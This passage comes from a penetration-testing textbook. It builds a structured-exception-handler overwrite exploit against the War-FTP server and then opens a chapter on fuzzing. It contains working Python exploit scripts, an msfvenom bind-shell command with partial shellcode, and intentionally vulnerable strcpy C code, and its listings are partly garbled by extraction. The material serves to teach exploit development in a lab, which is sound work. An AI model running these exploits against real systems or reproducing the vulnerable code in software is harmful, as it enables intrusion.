would work just as well.
Though this technique is a little more complicated, it’s similar to the
saved return pointer buffer overflow exercise we completed in Chapter 17.
We are hijacking the program’s execution and redirecting it to our shell-
code. Now we need to find an instance of POP POP RET instructions in War-
FTP or its executable modules.
safeseh
As SEH overwrite attacks have become prevalent, Microsoft has come
up with ways to stop them from working. One such example is SafeSEH.
Programs compiled with SafeSEH record the memory locations that will be
used for structured exception handling, which means that attempts to redi-
rect execution to a memory location with POP POP RET instructions will fail
the SafeSEH check.
It’s important to realize that even if DLLs in Windows XP SP2 and later
are compiled with SafeSEH, third-party software doesn’t have to implement
this mitigation technique. If War-FTP or any of its custom DLLs do not use
SafeSEH, we may not have to deal with this check.
Mona will determine which modules are not compiled with SafeSEH
in the process of finding the POP POP RET instructions when we use the com-
mand !mona seh, as shown in Figure 18-14.
412 Chapter 18
Figure 18-14: Running the SEH command in Mona
The results of !mona seh are written to C:\logs\war-ftpd\seh.txt, as shown in
part here.
0x5f401440 : pop edi # pop ebx # ret 0x04 | asciiprint,ascii {PAGE_EXECUTE_
READ} [MFC42.DLL] ASLR: False, Rebase: False, SafeSEH: False, OS: False,
v4.2.6256 (C:\Documents and Settings\georgia\Desktop\MFC42.DLL)
0x5f4021bf : pop ebx # pop ebp # ret 0x04 | {PAGE_EXECUTE_READ} [MFC42.DLL]
ASLR: False, Rebase: False, SafeSEH: False, OS: False, v4.2.6256 (C:\Documents
and Settings\georgia\Desktop\MFC42.DLL)
0x5f4580ca : pop ebx # pop ebp # ret 0x04 | {PAGE_EXECUTE_READ} [MFC42.DLL]
ASLR: False, Rebase: False, SafeSEH: False, OS: False, v4.2.6256 (C:\Documents
and Settings\georgia\Desktop\MFC42.DLL)
0x004012f2 : pop edi # pop esi # ret 0x04 | startnull {PAGE_EXECUTE_READ}
[war-ftpd.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v1.6.5.0
(C:\Documents and Settings\georgia\Desktop\war-ftpd.exe)
As you can see from the output, the only modules without SafeSEH
are the War-FTP executable itself and a War-FTP-included DLL called
MFC42.dll. We need to choose an instance of POP POP RET (or a logical
equivalent) from Mona’s output that avoids the four bad characters dis-
cussed in Chapter 17 (\x00, \x40, \x0a, \x0d). (To have Mona automatically
exclude entries with bad characters during the search, enter !mona seh -cpb
"\x00\x40\x0a\x0d". One such address is 5F4580CA. The instructions are POP EBX,
POP EBP, RET. Again, we don’t care where the instructions are stored, as long
as we POP two entries off the stack. If we overwrite SEH with the address
5F4580CA, these instructions will be executed, and we will redirect execution
to our attack string.
Structured Exception Handler Overwrites 413
Before we move on, set a breakpoint at 5F4580CA with bp 0x5F4580CA, as
shown in Figure 18-15.
Figure 18-15: Breakpoint at the POP POP RET
Replace the four Cs in the previous exploit with the POP POP RET memory
address in little-endian format, as shown in Listing 18-4.
#!/usr/bin/python
import socket
buffer = "A" * 569 + "B" * 4 + "\xCA\x80\x45\x5F" + "D" * 573
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.20.10',21))
response = s.recv(1024)
print response
s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)
print response
s.close()
Listing 18-4: Replacing the SEH overwrite with POP POP RET
Now run the exploit again. As you can see in Figure 18-16, the program
crashes again, and, as expected, SEH is overwritten with 5F4580CA.
414 Chapter 18
Figure 18-16: SEH overwritten with a POP POP RET address
Type shift-F9 to let the program pass the overwritten exception han-
dler. As expected, we hit our breakpoint, as shown in Figure 18-17.
Figure 18-17: We hit our breakpoint.
Structured Exception Handler Overwrites 415
The CPU pane (top left) shows that the next instructions to be exe-
cuted are the POP POP RET. Press F7 to step through the instructions one at
a time, and watch what happens to the stack (bottom right) as you do. You
will see ESP move down to a higher address as we execute the POP instruc-
tions. As you can see in Figure 18-18, when we execute the RET instruction
we end up in our attack string, at the pointer to the NSEH record, which is
currently filled with four Bs.
Figure 18-18: Execution is redirected to your attack string.
We have solved our first problem: We have redirected the program’s
execution to our attack string. Unfortunately, as we can see in Figure 18-18,
we only have four useable bytes before we run into our SEH overwrite
address, 5F4580CA. We have a long string of Ds after the SEH address, but
currently we are stuck with only four bytes to work with. We won’t be able
to do much with only four bytes of shellcode.
using a short Jump
We need to somehow bypass the return address and get to our long string
of Ds, which has plenty of space for our final shellcode. We can use the short
jump assembly instruction to move EIP a short distance. This method is ideal
for our purposes because we need to jump over the four bytes of the SEH
overwrite.
The hexadecimal representation of a short jump is \xEB .
Padding the short jump instruction \xEB  with two bytes
to take up all four bytes before the SEH overwrite, we can jump forward
six bytes over the padding and the SEH overwrite.
416 Chapter 18
Edit the attack string to include a short jump, as shown in Listing 18-5.
#!/usr/bin/python
import socket
buffer = "A" * 569 + "\xEB\x06" + "B" * 2 + "\xCA\x80\x45\x5F" + "D" * 570
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.20.10',21))
response = s.recv(1024)
print response
s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)
print response
s.close()
Listing 18-5: Adding a short jump
As shown in Listing 18-5, this time we replace the NSEH (previously
four Bs) with "\xEB\x06" + "B" * 2. Reset your breakpoint at the POP POP RET
before running the exploit again, and when you hit the breakpoint, step
through the program line by line (F7) to see what is happening. Now after
the POP POP RET we have a six-byte short jump, as shown in Figure 18-19.
Figure 18-19: Execution is redirected to the short jump.
Now press F7 to execute the short jump. As shown in Figure 18-20, the
short jump successfully bypasses the SEH overwrite address and redirects
execution to the rest of our attack string (Ds).
Structured Exception Handler Overwrites 417
Figure 18-20: The short jump gets us past the SEH overwrite.
Choosing a Payload
We have now redirected execution a second time, to a longer part of our
controlled memory—an ideal place for our shellcode. Now to choose a pay-
load and generate it with Msfvenom, as shown here.
root@kali:~# msfvenom -p windows/shell_bind_tcp -s 573 -b '\x00\x40\x0a\x0d'
[*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)
buf =
"\xbe\xa5\xfd\x18\xa6\xd9\xc6\xd9\x74\x24\xf4\x5f\x31\xc9" +
--snip--
Remember to tell Msfvenom to use a maximum size of 573 bytes and
exclude our bad characters for the FTP username. (Again, you might be
able to go a little bit longer, but our original exception occurs because we
are writing off the end of the stack. We want to make sure all of our shell-
code is executed.)Now add the shellcode to our exploit in place of the Ds.
To make the exploit long enough to trigger the SEH overwrite (instead of
the saved return pointer overwrite we saw in Chapter 17), pad the exploit
string out to 1,150 characters with Ds. The finished exploit is shown in
Listing 18-6. Our shellcode goes directly after our SEH overwrite. (In this
example, we again use a Windows bind shell.)
#!/usr/bin/python
import socket
shellcode = ("\xbe\xa5\xfd\x18\xa6\xd9\xc6\xd9\x74\x24\xf4\x5f\x31\xc9" +
"\xb1\x56\x31\x77\x13\x83\xc7\x04\x03\x77\xaa\x1f\xed\x5a" +
"\x5c\x56\x0e\xa3\x9c\x09\x86\x46\xad\x1b\xfc\x03\x9f\xab" +
418 Chapter 18
"\x76\x41\x13\x47\xda\x72\xa0\x25\xf3\x75\x01\x83\x25\xbb" +
"\x92\x25\xea\x17\x50\x27\x96\x65\x84\x87\xa7\xa5\xd9\xc6" +
"\xe0\xd8\x11\x9a\xb9\x97\x83\x0b\xcd\xea\x1f\x2d\x01\x61" +
"\x1f\x55\x24\xb6\xeb\xef\x27\xe7\x43\x7b\x6f\x1f\xe8\x23" +
"\x50\x1e\x3d\x30\xac\x69\x4a\x83\x46\x68\x9a\xdd\xa7\x5a" +
--snip--
buffer = "A" * 569 + "\xEB\x06" + "B" * 2 + "\xCA\x80\x45\x5F" + shellcode + "B" * 205
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.20.10',21))
response = s.recv(1024)
print response
s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)
print response
s.close()
Listing 18-6: The finished SEH overwrite exploit
When War-FTP is attached to Immunity Debugger, we have to manually
tell the debugger to pass SEH to the program. When we run War-FTP with-
out a debugger and an error is encountered, execution is automatically passed
to SEH, executing POP POP RET, the short jump, and finally our shellcode.
summary
We have successfully built an SEH overwrite exploit for War-FTP. Though
War-FTP allowed us to exploit the buffer overflow vulnerability by directly
overwriting a return address or SEH, some vulnerable programs will not
crash in a way that will allow you to control EIP but will allow you to over-
write SEH. In such cases, knowing the steps to exploit this sort of crash is
paramount to creating a working exploit. Due to the way structured excep-
tion handlers work, you can count on NSEH being at ESP+8 every time
you encounter this type of crash. When you overwrite SEH, you will find
the pointer to the next SEH record at ESP+8. After executing a POP POP RET
series of instructions from a module that is not compiled with SafeSEH,
you will need to execute a short jump to get to your shellcode in the attack
string. If you continue in exploit development, you may run into another
challenge where \xEB is a bad character, so you will need to find other ways
of performing a jump.
In the next chapter we will finish up our study of the basics of exploit
development with a few odds and ends, such as first discovering a crash
using a technique called fuzzing, porting public exploit code to meet our
needs, and writing our own Metasploit modules.
Structured Exception Handler Overwrites 419
19
fuz zing, Porting e xPloits,
anD me tasPloit moDules
In this chapter, we will review a few more basic exploit
development techniques. We will look at using a tech-
nique called fuzzing to find potential exploits in vulner-
able programs. We will also cover working with public
exploit code and safely porting it to meet our needs, as
well the basics of building our own Metasploit modules.
Finally, we will discuss some of the exploitation mitiga-
tion techniques that our targets may have in place.
Fuzzing Programs
In Chapter 17, we exploited War-FTP version 1.65’s Username field buffer
overflow with a 1,100-byte exploit string. The natural question is, how did
we know that 1,100 As in the Username field would crash the program, and,
more importantly, how did security researchers find this vulnerability for
the first time? In some cases, source code for programs is publicly avail-
able, so a researcher looking for vulnerabilities need only be well versed in
secure coding practices. In other cases, we can use a popular method called
fuzzing to send various inputs to a program, hoping that something strange
will happen.
Finding Bugs with Code Review
In Chapter 16, we used a short Linux program to illustrate a buffer overflow
vulnerability. When auditing the source code of this program (as shown in
Listing 19-1), we see the strcpy function u. As discussed in that chapter, this
function does no bounds checking and may be a security risk.
#include 
#include 
void overflowed() {
printf("%s\n", "Execution Hijacked");
}
void function(char *str){
char buffer[5];
strcpy(buffer, str); u
}
void main(int argc, char *argv[])
{
function(argv[1]); v
printf("%s\n", "Executed normally");
}
Listing 19-1: Vulnerable C code
Reading through this source code, we see that user input (the first pro-
gram argument) is passed to function v. The user input is then copied into
a five-character string called buffer using strpy u. As we saw in Chapter 16,
we can exploit this behavior to create a stack-based buffer overflow.
Fuzzing a Trivial FTP Server
When we don’t have access to a program’s source code, we have to use other
methods to find potentially exploitable security issues. We can use fuzzing
to send various inputs to the program that the developer never intended
the code to process. If we can find input that will manipulate memory in a
controllable way, we may be able to exploit the program.
In Chapter 17, when exploiting War-FTP 1.65, we first made the pro-
gram crash by sending 1,100 As in the Username field. Once we determined
that EIP contained four As, as well as a long string of As from the ESP reg-
ister, we concluded that this issue was exploitable and proceeded to write a
working stack-based buffer overflow exploit. In the following example, we
start a step earlier and use fuzzing to determine how many As we need to
send to a program in order to crash it.
422 Chapter 19
We can use fuzzing techniques to trigger crashes, which we can
use to build exploits. Let’s look at an example of fuzzing a Trivial FTP
(TFTP) server to find an exploitable vulnerability. We’ll use the 3Com
TFTP server version 2.0.1, which we found on our Windows XP system
during post exploitation.
TFTP runs by default on UDP port 69. Because it is connectionless, we
will need to know the syntax for TFTP communication to send UDP pack-
ets that the TFTP software will attempt to process. According to TFTP’s
Request for Comment (RFC) page, a proper TFTP packet is in the format
shown in Listing 19-2. To get TFTP to respond to us, we need to follow this
specification.
2 bytes string 1 byte string 1 byte
------------------------------------------------
| Opcode | Filename | 0 | Mode | 0 |
------------------------------------------------
Listing 19-2: TFTP packet format
When considering stack-based buffer overflow attacks, look for places
where the user controls the size and content of the input. If we can send
input that technically meets the TFTP specification but which contains input
that the code was not designed to process, we may be able to trigger a stack-
based buffer overflow vulnerability. In the case of this TFTP server, the first
field, Opcode, is always two bytes long and includes one of the following
strings:
opcode operation
01 Read request (RRQ)
02 Write request (WRQ)
03 Data (DATA)
04 Acknowledgment (ACK)
05 Error (ERROR)
However, we can control the Filename field. In a real TFTP request,
this is where we would tell the server the filename we want to read, write,
and so on. The length is variable and the contents of the string are user
controlled, so this may be a good place to look for stack-based buffer over-